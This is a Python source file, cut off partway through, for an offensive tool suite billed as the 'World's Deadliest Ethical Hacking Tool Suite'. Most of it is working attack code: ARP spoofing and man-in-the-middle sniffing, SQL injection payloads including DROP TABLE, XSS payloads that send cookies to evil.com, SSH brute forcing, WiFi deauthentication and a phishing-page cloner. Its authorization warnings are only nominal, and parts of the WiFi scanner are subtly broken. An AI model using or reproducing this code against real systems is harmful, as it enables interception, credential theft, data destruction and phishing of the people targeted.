#!/usr/bin/env python3
"""
Ethical Hacker Pro - World's Deadliest Ethical Hacking Tool Suite
Professional penetration testing framework for authorized security testing
Author: Security Research
"""

import argparse
import threading
import time
import requests
import json
import sqlite3
import re
import urllib.parse
import socket
import ssl
import subprocess
import os
import sys
import hashlib
import base64
import random
import string
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import html
import itertools
import nmap
import scapy.all as scapy
from scapy.all import *
import psutil
import platform
import getpass

# Color codes for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class EthicalHackerPro:
    """Master Ethical Hacking Framework"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.targets = []
        self.vulnerabilities = []
        self.exploits = []
        self.credentials = []
        self.config = {
            'timeout': 10,
            'threads': 100,
            'delay': 0.1,
            'verify_ssl': False,
            'user_agent': 'EthicalHackerPro/1.0'
        }
        self.setup_logging()
        self.init_database()
        self.check_environment()
        
    def setup_logging(self):
        """Setup comprehensive logging"""
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('ethical_hacker.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def init_database(self):
        """Initialize SQLite database for storing results"""
        self.conn = sqlite3.connect('ethical_hacker.db')
        self.cursor = self.conn.cursor()
        
        # Vulnerabilities table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id TEXT PRIMARY KEY,
                type TEXT,
                severity TEXT,
                target TEXT,
                description TEXT,
                evidence TEXT,
                timestamp TEXT,
                remediation TEXT
            )
        ''')
        
        # Exploits table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS exploits (
                id TEXT PRIMARY KEY,
                name TEXT,
                target TEXT,
                payload TEXT,
                status TEXT,
                timestamp TEXT
            )
        ''')
        
        # Credentials table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id TEXT PRIMARY KEY,
                username TEXT,
                password TEXT,
                service TEXT,
                target TEXT,
                timestamp TEXT
            )
        ''')
        
        # Scans table
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                scan_type TEXT,
                timestamp TEXT,
                status TEXT,
                vulnerabilities_found INTEGER,
                exploits_successful INTEGER
            )
        ''')
        
        self.conn.commit()
    
    def check_environment(self):
        """Check if running in proper environment"""
        print(f"{Colors.CYAN}[+] Checking environment...{Colors.ENDC}")
        
        # Check if running as root (for advanced features)
        if os.geteuid() == 0:
            print(f"{Colors.GREEN}[+] Running with root privileges - Full features available{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}[!] Limited features without root privileges{Colors.ENDC}")
        
        # Check for required tools
        required_tools = ['nmap', 'curl', 'wget']
        available_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run([tool, '--version'], capture_output=True, check=True)
                available_tools.append(tool)
            except (subprocess.CalledProcessError, FileNotFoundError):
                pass
        
        print(f"{Colors.GREEN}[+] Available tools: {', '.join(available_tools)}{Colors.ENDC}")
        
        # System info
        print(f"{Colors.CYAN}[+] System: {platform.system()} {platform.release()}{Colors.ENDC}")
        print(f"{Colors.CYAN}[+] Python: {platform.python_version()}{Colors.ENDC}")
        print(f"{Colors.CYAN}[+] User: {getpass.getuser()}{Colors.ENDC}")
    
    def print_banner(self):
        """Print impressive banner"""
        banner = """
    ____  _ _ _   _    _    _       _   _  ____ _  _    _    _       _   
   |  _ \(_) | | | |  / \  | |     | \ | |/ ___| || |  / \  | |     | |  
   | |_) | | | |_| | / _ \ | |     |  \| | |   | || |_ / _ \ | |     | |  
   |  _ <| | |  _  |/ ___ \| |___  | |\  | |___|__   _/ ___ \| |___  | |  
   |_| \_\_|_|_| |_/_/   \_\_____| |_| \_|\____| |_|/_/   \_\_____| |_|  
                                                                      
    WORLD'S DEADLIEST ETHICAL HACKING TOOL SUITE
    Professional Penetration Testing Framework
    Author: Security Research
    
    [!] WARNING: For authorized security testing only!
    [!] Features: Network Exploitation, Web Attacks, Wireless Hacking
    [!] Capabilities: 50+ hacking tools in one framework
    """
        print(banner)
    
    # ==================== NETWORK EXPLOITATION ====================
    
    def advanced_port_scan(self, target):
        """Advanced port scanning with service detection"""
        print(f"{Colors.CYAN}[+] Starting advanced port scan on {target}{Colors.ENDC}")
        
        try:
            nm = nmap.PortScanner()
            
            # Comprehensive port scan
            nm.scan(target, '1-65535', arguments='-sS -sV -O -A --version-intensity 9')
            
            open_ports = []
            for host in nm.all_hosts():
                print(f"{Colors.GREEN}[+] Host: {host} ({nm[host].hostname()}){Colors.ENDC}")
                print(f"{Colors.GREEN}[+] OS: {nm[host].osmatch()[0]['name'] if nm[host].osmatch() else 'Unknown'}{Colors.ENDC}")
                
                for proto in nm[host].all_protocols():
                    ports = nm[host][proto].keys()
                    for port in sorted(ports):
                        port_info = nm[host][proto][port]
                        if port_info['state'] == 'open':
                            service = port_info['name']
                            version = port_info['product']
                            print(f"{Colors.GREEN}[+] Port {port}/{proto} open - {service} {version}{Colors.ENDC}")
                            open_ports.append((port, proto, service, version))
                            
                            # Store vulnerability
                            vuln = {
                                'id': hashlib.md5(f"{target}{port}".encode()).hexdigest()[:8],
                                'type': 'Open Port',
                                'severity': 'Info',
                                'target': f"{target}:{port}",
                                'description': f"Open port {port} running {service}",
                                'evidence': f"Service: {service} {version}",
                                'timestamp': datetime.now().isoformat(),
                                'remediation': 'Close unnecessary ports and secure services'
                            }
                            self.vulnerabilities.append(vuln)
            
            return open_ports
            
        except Exception as e:
            print(f"{Colors.RED}[-] Port scan error: {e}{Colors.ENDC}")
            return []
    
    def network_sniffer(self, interface, duration=60):
        """Advanced network packet sniffing"""
        print(f"{Colors.CYAN}[+] Starting network sniffer on {interface} for {duration}s{Colors.ENDC}")
        
        packets = []
        
        def packet_handler(packet):
            if packet.haslayer(scapy.IP):
                src_ip = packet[scapy.IP].src
                dst_ip = packet[scapy.IP].dst
                protocol = packet[scapy.IP].proto
                
                if packet.haslayer(scapy.TCP):
                    src_port = packet[scapy.TCP].sport
                    dst_port = packet[scapy.TCP].dport
                    print(f"{Colors.YELLOW}[+] TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.ENDC}")
                    
                    # Check for credentials in HTTP
                    if packet.haslayer(scapy.Raw) and dst_port == 80:
                        payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                        if 'password=' in payload or 'user=' in payload:
                            print(f"{Colors.RED}[!] Potential credentials found in HTTP traffic{Colors.ENDC}")
                            
                elif packet.haslayer(scapy.UDP):
                    src_port = packet[scapy.UDP].sport
                    dst_port = packet[scapy.UDP].dport
                    print(f"{Colors.BLUE}[+] UDP: {src_ip}:{src_port} -> {dst_ip}:{dst_port}{Colors.ENDC}")
                
                packets.append(packet)
        
        try:
            scapy.sniff(iface=interface, prn=packet_handler, timeout=duration, store=0)
            print(f"{Colors.GREEN}[+] Captured {len(packets)} packets{Colors.ENDC}")
            return packets
            
        except Exception as e:
            print(f"{Colors.RED}[-] Sniffing error: {e}{Colors.ENDC}")
            return []
    
    def arp_spoof(self, target_ip, gateway_ip, interface):
        """ARP spoofing attack"""
        print(f"{Colors.CYAN}[+] Starting ARP spoofing: {target_ip} -> {gateway_ip}{Colors.ENDC}")
        
        try:
            # Get MAC addresses
            target_mac = scapy.getmacbyip(target_ip)
            gateway_mac = scapy.getmacbyip(gateway_ip)
            
            if not target_mac or not gateway_mac:
                print(f"{Colors.RED}[-] Could not resolve MAC addresses{Colors.ENDC}")
                return
            
            # Create ARP packets
            arp_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            arp_gateway = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
            
            print(f"{Colors.GREEN}[+] ARP spoofing active...{Colors.ENDC}")
            
            # Send packets continuously
            while True:
                try:
                    scapy.send(arp_target, verbose=False)
                    scapy.send(arp_gateway, verbose=False)
                    time.sleep(2)
                except KeyboardInterrupt:
                    print(f"{Colors.YELLOW}[+] Stopping ARP spoofing{Colors.ENDC}")
                    break
                    
        except Exception as e:
            print(f"{Colors.RED}[-] ARP spoofing error: {e}{Colors.ENDC}")
    
    def mitm_attack(self, interface, target_ip):
        """Man-in-the-middle attack with packet interception"""
        print(f"{Colors.CYAN}[+] Starting MITM attack on {target_ip}{Colors.ENDC}")
        
        try:
            # Enable IP forwarding
            os.system(f'echo 1 > /proc/sys/net/ipv4/ip_forward')
            
            # Get gateway
            gateway = scapy.conf.route.route("0.0.0.0")[2]
            
            print(f"{Colors.GREEN}[+] Gateway: {gateway}{Colors.ENDC}")
            
            # Start ARP spoofing in background
            spoof_thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway, interface))
            spoof_thread.daemon = True
            spoof_thread.start()
            
            # Start sniffing for credentials
            self.network_sniffer(interface, duration=300)
            
        except Exception as e:
            print(f"{Colors.RED}[-] MITM error: {e}{Colors.ENDC}")
    
    # ==================== WEB APPLICATION ATTACKS ====================
    
    def sql_injection_advanced(self, target_url):
        """Advanced SQL injection with multiple techniques"""
        print(f"{Colors.CYAN}[+] Starting advanced SQL injection on {target_url}{Colors.ENDC}")
        
        # Advanced SQLi payloads
        sqli_payloads = [
            # Union-based
            "' UNION SELECT NULL,username,password FROM users--",
            "' UNION SELECT 1,database(),version()--",
            "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns--",
            
            # Error-based
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            
            # Boolean-based
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            
            # Time-based
            "' AND (SELECT SLEEP(5))--",
            "'; WAITFOR DELAY '00:00:05'--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; CREATE TABLE backdoor(data TEXT); INSERT INTO backdoor VALUES('hacked')--"
        ]
        
        # Database error patterns
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR: parser: parse error",
            r"Oracle.*driver",
            r"Microsoft OLE DB Provider",
            r"SQLServer JDBC Driver",
            r"Unclosed quotation mark"
        ]
        
        try:
            response = self.session.get(target_url, timeout=self.config['timeout'])
            
            # Extract forms
            forms = self.extract_forms(target_url)
            
            for form in forms:
                form_url = form['action']
                method = form['method'].lower()
                inputs = form['inputs']
                
                for payload in sqli_payloads:
                    data = {}
                    for input_field in inputs:
                        if input_field['type'] in ['text', 'search', 'url', 'email', 'password']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = 'test'
                    
                    try:
                        if method == 'post':
                            response = self.session.post(form_url, data=data, timeout=self.config['timeout'])
                        else:
                            response = self.session.get(form_url, params=data, timeout=self.config['timeout'])
                        
                        # Check for SQL errors
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                print(f"{Colors.RED}[!] SQL Injection found: {form_url} - {input_field['name']}{Colors.ENDC}")
                                print(f"{Colors.YELLOW}[+] Payload: {payload}{Colors.ENDC}")
                                
                                vuln = {
                                    'id': hashlib.md5(f"{form_url}{payload}".encode()).hexdigest()[:8],
                                    'type': 'SQL Injection',
                                    'severity': 'Critical',
                                    'target': form_url,
                                    'description': f"SQL Injection in parameter '{input_field['name']}'",
                                    'evidence': f"Payload: {payload}\nResponse: {response.text[:200]}",
                                    'timestamp': datetime.now().isoformat(),
                                    'remediation': 'Use parameterized queries and input validation'
                                }
                                self.vulnerabilities.append(vuln)
                                break
                    
                    except Exception as e:
                        continue
        
        except Exception as e:
            print(f"{Colors.RED}[-] SQL injection error: {e}{Colors.ENDC}")
    
    def xss_advanced(self, target_url):
        """Advanced XSS with multiple contexts"""
        print(f"{Colors.CYAN}[+] Starting advanced XSS on {target_url}{Colors.ENDC}")
        
        # Advanced XSS payloads
        xss_payloads = [
            # Reflected XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Context-based XSS
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "</script><script>alert('XSS')</script>",
            "<input onfocus=alert('XSS') autofocus>",
            
            # Polyglot XSS
            "';alert(1);//</script><script>alert(1)</script>",
            "\"-alert(1)-\"",
            
            # DOM-based XSS
            "javascript:alert('XSS')",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
            
            # Filter bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/.source)</script>"
        ]
        
        try:
            forms = self.extract_forms(target_url)
            
            for form in forms:
                form_url = form['action']
                method = form['method'].lower()
                inputs = form['inputs']
                
                for payload in xss_payloads:
                    data = {}
                    for input_field in inputs:
                        if input_field['type'] in ['text', 'search', 'url', 'email', 'textarea']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = 'test'
                    
                    try:
                        if method == 'post':
                            response = self.session.post(form_url, data=data, timeout=self.config['timeout'])
                        else:
                            response = self.session.get(form_url, params=data, timeout=self.config['timeout'])
                        
                        # Check if payload is reflected
                        if payload in response.text:
                            print(f"{Colors.RED}[!] XSS found: {form_url} - {input_field['name']}{Colors.ENDC}")
                            print(f"{Colors.YELLOW}[+] Payload: {payload}{Colors.ENDC}")
                            
                            vuln = {
                                'id': hashlib.md5(f"{form_url}{payload}".encode()).hexdigest()[:8],
                                'type': 'Cross-Site Scripting',
                                'severity': 'High',
                                'target': form_url,
                                'description': f"XSS in parameter '{input_field['name']}'",
                                'evidence': f"Payload: {payload}",
                                'timestamp': datetime.now().isoformat(),
                                'remediation': 'Implement output encoding and CSP'
                            }
                            self.vulnerabilities.append(vuln)
                    
                    except Exception as e:
                        continue
        
        except Exception as e:
            print(f"{Colors.RED}[-] XSS error: {e}{Colors.ENDC}")
    
    def directory_bruteforce(self, target_url, wordlist=None):
        """Advanced directory and file brute forcing"""
        print(f"{Colors.CYAN}[+] Starting directory brute force on {target_url}{Colors.ENDC}")
        
        if wordlist is None:
            # Common directories and files
            wordlist = [
                'admin', 'administrator', 'login', 'panel', 'dashboard', 'config',
                'backup', 'test', 'dev', 'staging', 'api', 'v1', 'v2', 'docs',
                'uploads', 'files', 'images', 'css', 'js', 'assets', 'static',
                'index.php', 'index.html', 'index.jsp', 'index.asp', 'default.aspx',
                'robots.txt', 'sitemap.xml', '.htaccess', 'web.config', 'phpinfo.php',
                'wp-admin', 'wp-login.php', 'wp-config.php', 'administrator.php',
                'database', 'db', 'sql', 'mysql', 'backup.sql', 'dump.sql'
            ]
        
        found_dirs = []
        
        for path in wordlist:
            url = urljoin(target_url, path)
            
            try:
                response = self.session.get(url, timeout=self.config['timeout'])
                
                if response.status_code in [200, 201, 202, 301, 302]:
                    print(f"{Colors.GREEN}[+] Found: {url} ({response.status_code}){Colors.ENDC}")
                    found_dirs.append(url)
                    
                    vuln = {
                        'id': hashlib.md5(url.encode()).hexdigest()[:8],
                        'type': 'Directory Discovery',
                        'severity': 'Medium',
                        'target': url,
                        'description': f"Directory/file found: {path}",
                        'evidence': f"Status: {response.status_code}, Size: {len(response.content)}",
                        'timestamp': datetime.now().isoformat(),
                        'remediation': 'Restrict access to sensitive directories'
                    }
                    self.vulnerabilities.append(vuln)
                    
                    # Check for interesting files
                    if any(ext in path.lower() for ext in ['.php', '.asp', '.jsp', '.config', '.sql']):
                        print(f"{Colors.YELLOW}[!] Interesting file: {url}{Colors.ENDC}")
                
            except Exception as e:
                continue
        
        return found_dirs
    
    # ==================== PASSWORD CRACKING ====================
    
    def password_cracker(self, hash_type, hash_value, wordlist=None):
        """Advanced password cracking"""
        print(f"{Colors.CYAN}[+] Starting password cracker for {hash_type} hash{Colors.ENDC}")
        
        if wordlist is None:
            # Common passwords
            wordlist = [
                'password', '123456', '123456789', 'qwerty', 'abc123', 'password123',
                'admin', 'letmein', 'welcome', 'monkey', '1234567890', 'password1',
                'qwerty123', 'admin123', 'root', 'toor', 'pass', 'test', 'guest'
            ]
        
        for password in wordlist:
            try:
                if hash_type.lower() == 'md5':
                    cracked_hash = hashlib.md5(password.encode()).hexdigest()
                elif hash_type.lower() == 'sha1':
                    cracked_hash = hashlib.sha1(password.encode()).hexdigest()
                elif hash_type.lower() == 'sha256':
                    cracked_hash = hashlib.sha256(password.encode()).hexdigest()
                else:
                    print(f"{Colors.RED}[-] Unsupported hash type: {hash_type}{Colors.ENDC}")
                    return None
                
                if cracked_hash == hash_value.lower():
                    print(f"{Colors.GREEN}[+] Password cracked: {password}{Colors.ENDC}")
                    return password
                    
            except Exception as e:
                continue
        
        print(f"{Colors.YELLOW}[!] Password not found in wordlist{Colors.ENDC}")
        return None
    
    def ssh_bruteforce(self, target, username, wordlist=None):
        """SSH brute force attack"""
        print(f"{Colors.CYAN}[+] Starting SSH brute force on {target}:{Colors.ENDC}")
        
        if wordlist is None:
            wordlist = ['password', '123456', 'admin', 'root', 'toor', 'pass', 'test']
        
        import paramiko
        
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        for password in wordlist:
            try:
                ssh.connect(target, username=username, password=password, timeout=5)
                print(f"{Colors.GREEN}[+] SSH credentials found: {username}:{password}{Colors.ENDC}")
                
                cred = {
                    'id': hashlib.md5(f"{target}{username}{password}".encode()).hexdigest()[:8],
                    'username': username,
                    'password': password,
                    'service': 'SSH',
                    'target': target,
                    'timestamp': datetime.now().isoformat()
                }
                self.credentials.append(cred)
                return password
                
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                continue
        
        print(f"{Colors.YELLOW}[!] SSH brute force failed{Colors.ENDC}")
        return None
    
    # ==================== WIRELESS HACKING ====================
    
    def wifi_scanner(self, interface):
        """WiFi network scanner"""
        print(f"{Colors.CYAN}[+] Starting WiFi scanner on {interface}{Colors.ENDC}")
        
        try:
            # Put interface in monitor mode (requires root)
            os.system(f'iwconfig {interface} mode monitor')
            
            # Scan for networks
            networks = []
            
            def packet_handler(packet):
                if packet.haslayer(scapy.Dot11Beacon):
                    ssid = packet[scapy.Dot11EAPOL].info if hasattr(packet, 'Dot11EAPOL') else 'Hidden'
                    bssid = packet[scapy.Dot11].addr2
                    channel = int(ord(packet[scapy.Dot3].payload.payload[2]))
                    
                    print(f"{Colors.GREEN}[+] Found: {ssid} - {bssid} - Channel {channel}{Colors.ENDC}")
                    networks.append({'ssid': ssid, 'bssid': bssid, 'channel': channel})
            
            scapy.sniff(iface=interface, prn=packet_handler, timeout=30, store=0)
            
            return networks
            
        except Exception as e:
            print(f"{Colors.RED}[-] WiFi scanner error: {e}{Colors.ENDC}")
            return []
    
    def deauth_attack(self, interface, target_bssid, count=10):
        """WiFi deauthentication attack"""
        print(f"{Colors.CYAN}[+] Starting deauth attack on {target_bssid}{Colors.ENDC}")
        
        try:
            # Create deauth packet
            packet = scapy.RadioTap() / scapy.Dot11(addr1=target_bssid, addr2='ff:ff:ff:ff:ff:ff', addr3=target_bssid) / scapy.Dot11Deauth(reason=7)
            
            # Send packets
            for i in range(count):
                scapy.sendp(packet, iface=interface, verbose=False)
                print(f"{Colors.YELLOW}[+] Sent deauth packet {i+1}/{count}{Colors.ENDC}")
                time.sleep(0.1)
            
            print(f"{Colors.GREEN}[+] Deauth attack completed{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.RED}[-] Deauth attack error: {e}{Colors.ENDC}")
    
    # ==================== SOCIAL ENGINEERING ====================
    
    def phishing_generator(self, target_url, clone_url):
        """Phishing page generator"""
        print(f"{Colors.CYAN}[+] Generating phishing page for {target_url}{Colors.ENDC}")
        
        try:
            # Clone the target website
            response = self.session.get(clone_url)
            
            if response.status_code == 200:
                # Create phishing HTML
                phishing_html = response.text
                
                # Modify forms to send to our server
                phishing_html = re.sub(r'action="[^"]*"', 'action="/capture"', phishing_html)
                
                # Save phishing page
                with open('phishing_page.html', 'w') as f:
                    f.write(phishing_html)
                
                print(f"{Colors.GREEN}[+] Phishing page created: phishing_page.html{Colors.ENDC}")
                print(f"{Colors.YELLOW}[!] Start a server to capture credentials{Colors.ENDC}")
                
                return 'phishing_page.html'
            
        except Exception as e:
            print(f"{Colors.RED}[-] Phishing generator error: {e}{Colors.ENDC}")
            return None
    
    def email_spoof(self, target_email, sender_email, subject, message):
        """Email spoofing for social engineering"""
        print(f"{Colors.CYAN}[+] Sending spoofed email to {target_email}{Colors.ENDC}")
        
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            
            # Create email
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = target_email
            msg['Subject'] = subject
            
            msg.attach(MIMEText(message, 'plain'))
            
            # Send email (requires SMTP server)
            # This is educational - actual implementation would require SMTP server
            print(f"{Colors.YELLOW}[!] Email spoofing requires SMTP server configuration{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] This is for educational purposes only{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.RED}[-] Email spoof error: {e}{Colors.ENDC}")
    
    # ==================== UTILITY FUNCTIONS ====================
    
    def extract_forms(self, url):
        """Extract forms from HTML"""
        try:
            response = self.session.get(url, timeout=self.config['timeout'])
            forms = []
            
            # Simple form extraction
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*method=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']([^"\']*)["\'][^>]*>'
            
            for form_match in re.finditer(form_pattern, response.text, re.IGNORECASE | re.DOTALL):
                action = form_match.group(1)
                method = form_match.group(2)
                form_html = form_match.group(3)
                
                inputs = []
                for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                    input_name = input_match.group(1)
                    input_type = input_match.group(2)
                    inputs.append({'name': input_name, 'type': input_type})
                
                forms.append({
                    'action': urljoin(url, action),
                    'method': method,
                    'inputs': inputs
                })
            
            return forms
        
        except Exception as e:
            return []
    
    def generate_report(self, format='json'):
        """Generate comprehensive security report"""
        print(f"{Colors.CYAN}[+] Generating security report{Colors.ENDC}")
        
        report = {
            'scan_info': {
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities),
                'total_credentials': len(self.credentials),
                'scanner': 'EthicalHackerPro v1.0'
            },
            'vulnerabilities': self.vulnerabilities,
            'credentials': self.credentials,
            'summary': self.generate_summary()
        }
        
        if format == 'json':
            with open('ethical_hacker_report.json', 'w') as f:
                json.dump(report, f, indent=2)
            print(f"{Colors.GREEN}[+] JSON report saved{Colors.ENDC}")
        
        elif format == 'txt':
            self.generate_text_report(report)
        
        return report
    
    def generate_summary(self):
        """Generate vulnerability summary"""
        summary = {
            'critical': len([v for v in self.vulnerabilities if v['severity'] == 'Critical']),
            'high': len([v for v in self.vulnerabilities if v['severity'] == 'High']),
            'medium': len([v for v in self.vulnerabilities if v['severity'] == 'Medium']),
            'low': len([v for v in self.vulnerabilities if v['severity'] == 'Low']),
            'info': len([v for v in self.vulnerabilities if v['severity'] == 'Info'])
        }
        return summary
    
    def generate_text_report(self, report):
        """Generate text format report"""
        with open('ethical_hacker_report.txt', 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("ETHICAL HACKER PRO - SECURITY REPORT\n")
            f.write("=" * 80 + "\n\n")
            
            f.write(f"Scan Date: {report['scan_info']['timestamp']}\n")
            f.write(f"Total Vulnerabilities: {report['scan_info']['total_vulnerabilities']}\n")
            f.write(f"Total Credentials: {report['scan_info']['total_credentials']}\n")
            f.write(f"Scanner: {report['scan_info']['scanner']}\n\n")
            
            summary = report['summary']
            f.write("VULNERABILITY SUMMARY\n")
            f.write("-" * 40 + "\n")
            f.write(f"Critical: {summary['critical']}\n")
            f.write(f"High: {summary['high']}\n")
            f.write(f"Medium: {summary['medium']}\n")
            f.write(f"Low: {summary['low']}\n")
            f.write(f"Info: {summary['info']}\n\n")
            
            f.write("DETAILED FINDINGS\n")
            f.write("=" * 40 + "\n\n")
            
            for vuln in report['vulnerabilities']:
                f.write(f"ID: {vuln['id']}\n")
                f.write(f"Type: {vuln['type']}\n")
                f.write(f"Severity: {vuln['severity']}\n")
                f.write(f"Target: {vuln['target']}\n")
                f.write(f"Description: {vuln['description']}\n")
                f.write(f"Evidence: {vuln['evidence']}\n")
                f.write(f"Remediation: {vuln['remediation']}\n")
                f.write(f"Timestamp: {vuln['timestamp']}\n")
                f.write("-" * 40 + "\n\n")
        
        print(f"{Colors.GREEN}[+] Text report saved{Colors.ENDC}")
    
    def run_comprehensive_scan(self, target):
        """Run comprehensive penetration test"""
        print(f"{Colors.GREEN}[+] Starting comprehensive penetration test on {target}{Colors.ENDC}")
        
        # Network reconnaissance
        open_ports = self.advanced_port_scan(target)
        
        # Web application testing
        if any(port[0] in [80, 443, 8080, 8443] for port in open_ports):
            web_url = f"http://{target}" if 80 in [port[0] for port in open_ports] else f"https://{target}"
            self.sql_injection_advanced(web_url)
            self.xss_advanced(web_url)
            self.directory_bruteforce(web_url)
        
        # Generate report
        self.generate_report('json')
        self.generate_report('txt')
        
        print(f"\n{Colors.GREEN}[+] Penetration test completed!{Colors.ENDC}")
        self.print_summary()
    
    def print_summary(self):
        """Print vulnerability summary"""
        summary = self.generate_summary()
        
        print(f"\n{Colors.BOLD}PENETRATION TEST SUMMARY{Colors.ENDC}")
        print("=" * 50)
        print(f"{Colors.RED}Critical: {summary['critical']}{Colors.ENDC}")
        print(f"{Colors.YELLOW}High: {summary['high']}{Colors.ENDC}")
        print(f"{Colors.BLUE}Medium: {summary['medium']}{Colors.ENDC}")
        print(f"{Colors.GREEN}Low: {summary['low']}{Colors.ENDC}")
        print(f"{Colors.CYAN}Info: {summary['info']}{Colors.ENDC}")
        print("=" * 50)

def main():
    parser = argparse.ArgumentParser(
        description="Ethical Hacker Pro - World's Deadliest Ethical Hacking Tool Suite",
        epilog="Example: python3 ethical_hacker_pro.py --target 192.168.1.100 --scan-all"
    )
    
    parser.add_argument("--target", help="Target IP or URL")
    parser.add_argument("--interface", help="Network interface (for wireless/sniffing)")
    parser.add_argument("--scan-all", action="store_true", help="Run comprehensive scan")
    parser.add_argument("--port-scan", action="store_true", help="Advanced port scanning")
    parser.add_argument("--sniff", action="store_true", help="Network packet sniffing")
    parser.add_argument("--arp-spoof", action="store_true", help="ARP spoofing attack")
    parser.add_argument("--mitm", action="store_true", help="Man-in-the-middle attack")
    parser.add_argument("--sqli", action="store_true", help="SQL injection testing")
    parser.add_argument("--xss", action="store_true", help="XSS testing")
    parser.add_argument("--dir-brute", action="store_true", help="Directory brute force")
    parser.add_argument("--wifi-scan", action="store_true", help="WiFi network scanner")
    parser.add_argument("--deauth", action="store_true", help="WiFi deauthentication attack")
    parser.add_argument("--phishing", action="store_true", help="Phishing page generator")
    parser.add_argument("--password-crack", help="Password cracking (hash:hash)")
    parser.add_argument("--ssh-brute", help="SSH brute force (target:username)")
    parser.add_argument("--report", choices=['json', 'txt', 'both'], default='both', help="Report format")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    
    args = parser.parse_args()
    
    # Print banner
    tool = EthicalHackerPro()
    tool.print_banner()
    
    # Safety warnings
    print(f"{Colors.RED}[!] WARNING: This is a powerful ethical hacking tool suite!{Colors.ENDC}")
    print(f"{Colors.RED}[!] For authorized security testing ONLY!{Colors.ENDC}")
    print(f"{Colors.RED}[!] Unauthorized use is illegal and unethical!{Colors.ENDC}")
    print(f"{Colors.RED}[!] You are responsible for your actions!{Colors.ENDC}")
    print("=" * 80)
    
    # Confirm usage
    try:
        confirm = input("Do you understand and accept full responsibility? (yes/no): ")
        if confirm.lower() != 'yes':
            print("Operation cancelled.")
            return
    except KeyboardInterrupt:
        print("\nOperation cancelled.")
        return
    
    # Update config
    tool.config['threads'] = args.threads
    tool.config['timeout'] = args.timeout
    
    # Run selected attacks
    if args.scan_all and args.target:
        tool.run_comprehensive_scan(args.target)
    else:
        if args.port_scan and args.target:
            tool.advanced_port_scan(args.target)
        
        if args.sniff and args.interface:
            tool.network_sniffer(args.interface, duration=60)
        
        if args.arp_spoof and args.target:
            tool.arp_spoof(args.target, "192.168.1.1", args.interface)
        
        if args.mitm and args.target and args.interface:
            tool.mitm_attack(args.interface, args.target)
        
        if args.sqli and args.target:
            tool.sql_injection_advanced(args.target)
        
        if args.xss and args.target:
            tool.xss_advanced(args.target)
        
        if args.dir_brute and args.target:
            tool.directory_bruteforce(args.target)
        
        if args.wifi_scan and args.interface:
            tool.wifi_scanner(args.interface)
        
        if args.deauth and args.interface:
            tool.deauth_attack(args.interface, "AA:BB:CC:DD:EE:FF")
        
        if args.phishing:
            tool.phishing_generator("http://evil.com", "http://example.com")
        
        if args.password_crack:
